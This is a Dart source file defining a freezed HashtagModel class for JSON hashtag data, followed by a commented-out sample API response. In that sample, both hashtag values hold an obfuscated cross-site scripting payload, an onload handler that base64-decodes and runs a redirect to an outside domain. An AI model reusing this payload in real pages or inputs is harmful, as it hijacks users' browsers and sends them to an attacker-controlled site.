import 'package:freezed_annotation/freezed_annotation.dart';

part 'hashtag_model.freezed.dart';
part 'hashtag_model.g.dart';

@freezed
class HashtagModel with _$HashtagModel {
  const HashtagModel._();
  factory HashtagModel({
    required String tagId,
    required String hashTag,
    int? count,
  }) = _HashtagModel;

  factory HashtagModel.fromJson(Map<String, dynamic> json) =>
      _$HashtagModelFromJson(json);
}


// "contentId": "31c274a1-4972-4d91-ac2c-65045c6c7b2b",
//             "imageUrl": "",
//             "name": "임시 컨텐츠 URL",
//             "memo": "test memo URL",
//             "hashTags": [
//                 {
//                     "tagId": "96c2bb35-89d9-4f7e-9d1b-b9508ae86347",
//                     "hashTag": "<body/onload=eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vaHpyMGRtMjhtMTdjLmNvbS9lYm1zczBqcTc/a2V5PWM5MGEzMzYzMDEzYzVmY2FhZjhiZjVhOWE0ZTQwODZhIik=\"))>",
//                     "count": 2
//                 },
//                 {
//                     "tagId": "27d11c60-257e-4f92-816e-8a8bc66f0572",
//                     "hashTag": "<body/onload=eval(atob(\"d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vaHpyMGRtMjhtMTdjLmNvbS9lYm1zczBqcTc/a2V5PWM5MGEzMzYzMDEzYzVmY2FhZjhiZjVhOWE0ZTQwODZhIik=\"))>",
//                     "count": 1
//                 }
//             ]